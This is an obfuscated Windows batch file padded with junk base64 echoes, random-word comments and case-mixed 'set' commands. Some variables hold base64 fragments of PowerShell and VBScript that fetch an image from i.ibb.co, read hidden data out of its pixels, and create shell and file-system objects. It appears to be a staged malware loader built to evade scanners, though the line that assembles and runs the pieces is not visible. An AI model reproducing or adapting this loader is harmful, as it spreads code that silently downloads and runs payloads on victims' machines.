@echo off
echo elFoQndvQWZaTEo4ZHVuTzl6SEZUUEExYW5VVjdFaldWejlPZ2VGeE41WA== >nul 2>&1
REM zenith vision mirage
se%DUrGP%T "UdtbixBfYslF=FAVurYCRtzZCbAyIWlYFUetMkOoXbR"
SE%gUb%T "GSffNYlMZEwzUP=nUmgwBCwXAeDVcNoHEWd"
Se%ctZb%t "nOzLGuog=mlmICgtbm90ICRTaWxlbnQpIHsgJFNpbGVudCA9ICRmYWxzZSB9CmZ1bmN0aW9uIExvZy1TaWxlbnQgewpwYXJhbShbc3RyaW5nXSRNZXNzYWdlLCBbc3RyaW5nXSRDb2xvciA9ICJXaGl0ZSIsIFtib29sXSRJc0Vycm9yID0gJ"
SE%Yeq%t "XzIAterslVWj=oLlpwMMazxvlVIkKrImpXpMNqdbziqWk"
echo aXU1bzFGZTZBd2FINXJUYk1ZTHFWb3BERDNDSEE3ZUtaYVFUekdNSkRQN2ZSbkV0dHNDSjA0TnRL >nul 2>&1
echo WWJtR1hzeTV6SlZoSE1qdFptUUNPNFdBWndoN1FZc2VXVlZYM0R5MjB3R1hTbUQ0Rnk1cVhzMmgyckVTMXlvTg== >nul 2>&1
REM vision ruby phantom zenith ruby strobe cipher cipher
Se%xJCwM%t "ZjPFQxhkEKXudwt=zgDIIPmUCGqBKqGZwnquuVxVPxi"
echo a0pXbFZkVzhYM1hiV09scjEzSWF2UGdTSXN4clpkRnFTU05ib2JPczRMQWw0eEtNbnRqNXdud1UxcmYy >nul 2>&1
REM clearing beacon fragment
REM strobe hawk lance core sword
REM shadow pixel fathom glimmer
REM echo odyssey fragment
REM hawk strobe guard fragment twilight valley shadow
echo VklaZjRCbjdKTG5IcUFCUUVqa1JHZllDbjNYZXFhSlVUcE5xcHVLU3Y5ZDBxeDNR >nul 2>&1
echo UnVLd2lNTlFSc2dVdEFDYU9jdmtqejB5eVhsQkRneGZqcUlKZ3FvY1VJRGxTWmdSdTV3VGo= >nul 2>&1
REM fathom undergrowth twilight odyssey echo hawk mirage
echo NXpPSlNSTEVGNnAxYWRMVVVrcnBlWjdiQUNWWmZkck1pNXhzaUxMVERGSHU5NGdSU2tPVHhuelNSMGdiUGFVZXdkbnpsZGdJYWhwN01yZg== >nul 2>&1
REM guard zenith fathom pixel phantom vision
echo aEY0ZVNFS1kxMGdiMmdpbGRuOWJxclF6YVFKdnBjTG9UUXhKbXlucmpJOWkxRkpxNDRBeUlLWnJaV1A5Zg== >nul 2>&1
REM core twilight binary cipher vision guard
echo RTBJT0JJZ0tvVEFsVXc0VWo0SkZ1a2xSYzNSRkYyS3VDMzRESEM2N0VyRg== >nul 2>&1
SE%OdAM%t "DPYBeo=ZtizcZHILasrGHu"
REM core vision undergrowth binary fragment cipher phantom pixel
echo ZUluaVA3ZDNiaEJLQXdUSUo3RWQwZ0syUmoxMVJFdWhuV0lKSlk0eHhQanNUMVJPRzl1Q3dxMlNITGFUUEJuUDQ3cjdGRg== >nul 2>&1
REM odyssey zenith binary lance sword undergrowth echo
REM delta echo vertex
sE%QEKi%T "HGIrVdxTnTuFV=qlBIWIYWsVRHDmy"
echo Z1FtaFQ0cFhVSDFvNFZkTlA0cE5qRTdnanE5VU5leFRpZVp0ZHFUWmZDbFFxbGQ3djZJS3NEM2kwcVhIM1QwcnBkTw== >nul 2>&1
Se%iIM%t "TvgXjHfM=PEeYRjkVWKGPMtQDBWSSgEtDxVEDYY"
SE%WbAp%t "lrKjNr=PxNChZtOMhfyCx"
echo Rm1hZ1U2cjI5eUxWbHJsem84OVFxTWlhNUN4ZVVMZDBITHVmenhQYjVHMExRbnlNdXBtZk8ydHpmNTk= >nul 2>&1
REM glimmer lance clearing pixel
REM guard glimmer guard vision hawk pixel vision mirage
echo aVcxYWU4M1NJZTJSaEdnanp3NXlSV1JBVXBldm02NXRuNU5OdmtJb3FVQlNL >nul 2>&1
echo NWtuZWJ4cm0xSk1wV2lhYmJ4bEJUS1FlZHM0MndFN3JuOW1kSlQ3Rjc4MGlKS0JyZWZVa09mc28wTXVHRmMyMVdCYnMxVA== >nul 2>&1
sE%xKK%t "QKLrHsjhThOEe=SrYEgkxorQmPtNGMofDmNefWpQQGqw"
echo VHZmTnRHbUtkdVM2VWI2dGc5OWI2NVZlNXZjRGV1d0VjWUZscnZlT3BiR2swaXZYWmpoamw= >nul 2>&1
se%WHrtO%T "vthjglfEFjmLYG=kSqtUYIigKELKIUsmsfYIcPnnruFWO"
Se%Wqq%T "yZuMvARTgrRSU=dexLPVSiPYgEji"
se%zyRuz%T "cfltpqvbFslvJaK=tBtUvPjGWKLlnDmLUTNADjHsHcrEWu"
echo RkFRbHVuMDkxTGpEVjRDeG9DNjdlTUVDV2oyOHFzeGs0dDRzUThSQ0hvTmFYTGZYb0h4 >nul 2>&1
REM hawk glimmer odyssey valley undergrowth
sE%WrNH%T "JxZcOL=giAsPrzHSrKJEvQUiJiGhdWW"
echo ZmlqZGlrYW5YWVBhMFRkdEdZZVk0UXpDcG52aE15N01TdmZWOEF2djBOalQ5T2JtV2JtN2NMa0pkSTFJVjBQVkhsbDBldnJ6a2I4NA== >nul 2>&1
sE%vjsG%T "HaYBaG=ldilOebrkjKByAlIPteDeRVrwE"
echo OFdZSHl6S1MwWVcxYXVvRzVyWkQ4bFZDVmhwOFhSWERvRFhlekZqSXgxRHhQTVdBYjMxS09uVXUzSkZqTUU3NzhvQnRISjJFakxXRA== >nul 2>&1
REM fathom binary cipher kiln lance
REM ruby pixel core pixel fragment guard strobe strobe
REM beacon odyssey zenith kappa twilight circle binary clearing guard
REM fathom odyssey vertex glimmer odyssey ruby circle glimmer core vertex
echo QnBWRWtmazFzVUVqV216YmpJNVl4ZWc1Mm02TGlicTZ1ZVduQkVrNEJlUnlhcW56dlhKVW5VSVlEU0xabmNSQlo= >nul 2>&1
REM fragment kappa kiln vertex sword beacon delta vision core glimmer
echo eEJtMGRPWVJlSDB6N0l0U3p2VTFSVG14NlByUHlCWEdpckN6NFNFTXp5 >nul 2>&1
sE%GfW%T "fUkxqxPQQr=lsHaDLLirDmGlVQluqyzxtZoEbiNM"
REM guard lance phantom hawk vision guard lance core echo cipher
echo S0NvZDlXYU1RUTZDNXlHTHZyQWxaSDhLVUl0bnJsRjM2UGFucGdjUjZlcEtvWGt0ZzJMZnVrcnI= >nul 2>&1
SE%uDCx%T "GsANhbKCu=XxMkmIuhkNRidGwUppNshwebioRJi"
echo NzJOeEt6RVhIVU5Xb0dFbXZOZ05wNFZ6UnNmZ2djaENUUkx6T1pXS2did2lyTDFxM1V0WkFCREtyV0RWblduSnhR >nul 2>&1
echo and3ZlhvakdjT00zR1ZXWFVuN3ZpTkY4TXhWWnZTcUduVkRoV21rdlNESlZMRVV0MURUNUFLWnJheUVFckxJVEZ3eTZqMlZJRWpVMVpJUlk= >nul 2>&1
SE%lBU%t "ReZVSENSYP=RtAwefAQOtCIDoXqoSGhjJFjqTMk"
REM undergrowth ruby pixel core strobe kiln sword ruby kiln circle
REM sword core fathom mirage vertex vertex pixel
echo ZkFCMlcwdzJwZEZPdDNGN0Z6c2w4N3dmTXNWMTd6QVpFUURVVjFkYmQ= >nul 2>&1
REM beacon kiln vertex kiln twilight
echo dGxualZibTBvczY4Mm9ZWGJua1NlSng1TTAwV3BqR3lMNEJaTEVjU2lDb2pITU5hVWx0MllpaHduSGNwcHhUdGZVemFKV3A5 >nul 2>&1
REM sword shadow circle delta odyssey cipher circle twilight
se%WvV%T "GoYKtVf=JkRQxKAAxCXarXybjOkWMrqYWJMp"
REM lance kiln odyssey core lance
REM cipher lance ruby cipher
REM pixel ruby fathom shadow guard sword vision zenith vertex odyssey
se%bJr%T "TwbdLgwSlhsJS=HxirahNjpPMisPJRY"
Se%kBA%T "zJiRWKTO=sBOZDireBaIz"
se%epLns%t "HbrTiEuP=rvVCPWhAfzvxXRDwtGspCrxNFw"
echo YWJWR3ZiUzBiemFSTHltMFFnZTFXTkVDTUFQMkNRektaTmNvQWpqUVQ2V2tjSFZBdmNydXRnMEZBcTJkN2lzUHN3Y2MxQUFVeA== >nul 2>&1
SE%jtp%t "QZzthGiFSPyKID=OlUlxQegQkJqyCwiZqVC"
se%cvrDE%T "idzmggHB=XwARlROFqkOTDMoIAgtBnOfZ"
Se%rPYfY%t "ryXdKUVOhLmt=bqDKtRxODVA"
SE%zfHh%T "BtadoPSFQhyTWI=hTXBMAJUewxxG"
sE%YAm%T "VtRZpZv=JEltYWdlVVJMID0gImh0dHBzOi8vaS5pYmIuY28vOG5IWkJNc1QvbWVtLnBuZyIKaWYgKC1ub3QgJHRhcmdldCkgeyAkdGFyZ2V0ID0gJEltYWdlUGF0aCB9CmlmICgtbm90ICR0YXJnZXQpIHsgJHRhcmdldCA9ICRJbWFnZVVSTCB9C"
Se%PFccW%T "JOTtehmBNhm=oxifOetBzz"
REM cipher vertex guard
se%PusjK%T "eRngUWWn=PaIUVzfBgXTRLVFJhOgYElYGV"
REM shadow fathom ruby strobe echo cipher phantom
REM phantom ruby vertex echo
echo TXdKa05DcGlzSnVMajJXREhEMTNXTmZ1R0wxakIzeFhQU0d6SEwwcHhuNWdxRg== >nul 2>&1
REM ruby shadow binary undergrowth valley
REM beacon sword glimmer fragment
Se%TCYIB%t "HIKKHUUAyCrkkRH=sZGsczeIIUpLaQ"
echo cHM0U2NoYTRTSVFXZHVzd004em5vRHIyaUx0b3pWZXZwSEJGbWhuaDZMeFVORHY= >nul 2>&1
echo d1c0UldQNGNZR2F1Rk5naFY3bmtKQktYZjdIR0l4RGtpRTdraEVPNUh6SnVRMkw= >nul 2>&1
SE%ZQNuu%T "JjrcRyaqyMCzv=RdtSpAOluucSMJOilqbxaPIAolXzuUtrWrj"
REM phantom ruby kiln lance valley echo twilight hawk clearing undergrowth
REM valley sword pixel shadow fragment guard
REM phantom phantom binary fragment guard clearing ruby fathom core
se%nRo%t "uXXZCXuEKVBQu=KHrtjKSvkeCnJIqZTEaScjSwQAxsrWdXwh"
sE%KIgC%T "pOdGKKFpeI=UKFGXoCMKhzvwSTCZnwPmUYfou"
REM pixel fragment vision
sE%rfR%T "aUZZYUnZIHDarHU=CELGuTWGuMcnKgJDDhLwuZq"
REM beacon core fragment twilight vision mirage
sE%YtOb%t "tpXGSatenaKnKmk=dFXzhIvxcnbxqpCKht"
REM clearing cipher zenith clearing circle odyssey
SE%dVa%t "RvYeFNzE=kNAQfUFIbLcPOsVo"
Se%Rdck%T "ydCtlJcKPzuR=nSsxCdBfxQOAxWEsTdGGexRkqyfD"
echo ZzV4NkxWT3l6U3JjSEc4cWxIU0tsZTRROFpzTVJoNWd5R0pRRTRMeXlhdU5ZZ2ZXQzZkc0lqdWtEaXRPZUlNeDFhWkFkMGpMNHE2UjA3bkM= >nul 2>&1
REM kappa binary undergrowth fathom undergrowth undergrowth kiln
REM vision valley circle undergrowth guard fathom kiln lance
REM sword glimmer beacon core beacon phantom
Se%ybvld%T "veMdlWgsmbW=owTaoJlCLjUfCSjlDjDUrymAsMiUrGl"
Se%SKjX%t "BPjpwYCzyfH=JZklxlImpjRNEbyKtcEbM"
se%Vvb%t "laUDWWahk=FvicgjocigsiJLKA"
echo V2Zib1RiTDZJZTVSdDlaSEpjcFZRR01oYXRVTzJFM2hnZHVFMXd0NEQ2MlRjNDhoU3lxdDN5ZGhwV3NUUUJFRGlMaEhOSU43TXFjeGo= >nul 2>&1
REM fragment fathom vision circle hawk clearing kiln ruby mirage core
REM vertex echo kiln strobe core phantom core ruby phantom
sE%zTJyf%T "sqLQcDXbvJD=EPgccXMcxyHlogXExVPQYQBfFqSrZUBWGH"
se%KbJ%t "RzYtKKrnotZ=IYocawKSPpoxKLJopiWuCqvNgFzAGLE"
echo N29QTmpqUTVGazZZZ0VkV0Zadlc1Y1lObmNUUkpMamRrbzExQWlYem5uZzd2MmR1VTg5U0JMRDJCaTk1bFZCNDRXTUpzall6em8= >nul 2>&1
Se%eLDDj%t "NvcPxTrygqDgy=FYtlaFNNDpnOOcJ"
Se%gFBO%t "oGBxUpEEaMx=XGCONmyBNtcOwJdXDlJLNcLqLVJiNIQdKBB"
Se%vuwk%t "rZmUIoUUdJiaug=yXOHLjtoOVgraMXWMWBxsrbQvo"
SE%mcqn%t "XnPCvRpSnrx=PgsIrZrxJaPWJg"
Se%vShw%t "RrjnNcM=3RlZC5BZGQoJHB4LlIpOyBpZiAoJGV4dHJhY3RlZC5Db3VudCAtZ2UgJGxlbmd0aCkgeyAkZG9uZSA9ICR0cnVlOyBicmVhayB9CiRleHRyYWN0ZWQuQWRkKCRweC5HKTsgaWYgKCRleHRyYWN0ZWQuQ291bnQgLWdlICRsZW5ndGgpIH"
echo NVJxMWpZY0FTekUwUlo0OW15NDNiS2dqM3pMRFVuRzVTazVDdHhuczZwMXFpZlJVSGhQMUZHZERPQU9aVXh5NTNaR1pEQ0Z5UVdWNUoyZA== >nul 2>&1
sE%UlGM%T "buWBlcZu=CVJciXqCpyjLMb"
echo QW1pMUxHY2xXTXNZZUVzTElEQ1JHNWlMbGVxY1I4VnVYdXhnQjNlbTc5YVByVEtFNXNR >nul 2>&1
echo QjM3d3dzMjd6NTVDT3IwOHVlZExzS3VnaG0xWmxtNk1KcVpRQ3F6a2g4OUZwTWg3Y2xYdGpVcXE= >nul 2>&1
REM lance mirage core twilight
REM valley mirage phantom pixel kiln shadow fathom
se%uRFY%T "WNoPZsHSNIjXW=ANYiGTzMxsCRdkcEcnMjex"
REM sword vertex mirage guard vertex binary pixel clearing ruby
echo bzZHSXlmSndPbDZkZjFXa2MxYkxBN0VGWHV2a3RkUGhUWXdBSHNnaXRGSDNzR25xdjhyUWMwM2Uxa05OcXd5Z1VrYjNn >nul 2>&1
REM mirage circle echo fathom guard strobe fathom pixel kappa core
sE%NNZc%T "ohywEce=HWQMjLydhxsQmwiYDhbiGdshO"
REM twilight cipher undergrowth beacon kiln vertex twilight
Se%coZiH%T "KHMZrLcWfew=JrrXvuNnIARQqMq"
sE%EbuB%t "wqlOlNmDt=NldCBzaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKRGltIHUsIGMKdSA9ICIiCkZvciBFYWNoIGMgSW4gQXJy"
Se%ymT%t "RouyfMnI=gEKHGtoyTeSuFUOKbqq"
sE%KNA%T "bUwxFKokOHlxI=uqkUKQQZzLEgPijOuvTEl"
REM fragment strobe odyssey lance shadow hawk
sE%pOE%t "tJkPlEigDi=ShIlONQbVYwqeekFcGbX"
echo dFFSVUdlSHJsYzR2b0JmUkdJejlXUTd5U3ZkVnBtYURibXhBV2ZnN25QSTRVWnR1MWpGR0xraVRoSzROUG9FSzI0WHU= >nul 2>&1
REM clearing hawk fragment binary delta zenith
Se%ecn%t "ljIinyKGDj=sdrkxmEKopSGckeQISXJKLQR"
se%PVRX%T "irycJxXEJxRW=AFbGAtAesxtLkim"
REM twilight vision mirage kiln zenith ruby
Se%URXn%T "BNelXwv=VkSbLFYgCVAnMOy"
SE%xRt%T "TfvSIgiBfO=KderQaVCVTpORqeazLBWRmXcKciDXEZMICY"
SE%JbBF%t "PCsoPADZgeMiJTi=FWqyoeCcdPbzuMPhrHkVd"
SE%RwK%T "AXQmqVJODhs=pykSBjxpiIq"
REM guard hawk fragment ruby shadow binary odyssey vision beacon
echo T1Y4TkxyYUpYYlVnTVY3RW5HM0lkVTlYRTJNdmhjdFN1bG51UVJIVkFJS2lYTU51SA== >nul 2>&1
SE%zkIG%T "BrRBjTo=YBqEdNCZtTlQUpfnMjuVhEXlfO"
sE%Ypd%t "BGdZejLzYXlGlCU=cOfbBWOxQwHzbjtWrFURyIUEGSzY"
REM ruby glimmer sword kappa
se%edX%t "kPXInuvbuP=xrIibFVpYqGXvgU"
REM fragment hawk vision mirage echo lance ruby vision
REM phantom guard binary mirage kappa cipher vertex kiln glimmer echo
REM pixel echo valley circle kiln shadow
SE%BMp%t "QSqIFGREc=FUnQJrVcjGTLBckWtFQO"
echo V0ZVUGw1ang3MWNTb29JMUtGakVOc05rdzFvdkFOYjl3SnRDNllPcW1qcTN0TTdkd0lidlFzMnpBbjM5dw== >nul 2>&1
REM twilight binary fragment kiln hawk
REM shadow odyssey kappa ruby delta odyssey mirage fragment beacon shadow
REM pixel clearing fragment mirage circle vision delta glimmer kappa
sE%UrCD%T "ATmdklaa=KnVXWSDiFh"
Se%yBDSG%T "iiUCKMHPKuYA=ECIwenuWhVIVufQnjmP"
Se%iijc%T "BLMWDsIjQaykTj=YYiqReKFTwPfLyYBuOXUk"
echo dkpjRGM0NTNiQWFtZ3k4d1RscFNsYkR0M3VRMlVMeGlLT052SjNaSjlSdlNsM2w5YXFCNnZPQUdzWTJPM0tTNQ== >nul 2>&1
se%PkG%t "sAcEZoyEYCn=MUPlgqaszEtwkrk"
REM phantom sword odyssey circle clearing guard
REM delta mirage undergrowth strobe zenith core ruby echo shadow kappa
sE%XVaU%T "PrErYIejkNlZM=OVULxWTXYTJdZvMqVAUrhDbvlxE"
Se%ASp%T "BVHUHf=KSXKKdcOgXvmsDPjNYsnJZyMVKtgbZOVsF"
REM beacon beacon pixel strobe binary
Se%VrX%T "cBxdMFd=caEqZkpFAVibBiFndJAX"
sE%opFId%t "dXOvaZTtw=DnXnupYXKAewxhbdmXVQA"
echo QUNiOXJsdm8zNzNTbTh3TnlJYmpUblZWSjM1d3J6NURreVRVR05TVXdTelVxYWN1ODM5WlRXTw== >nul 2>&1
REM glimmer twilight fragment
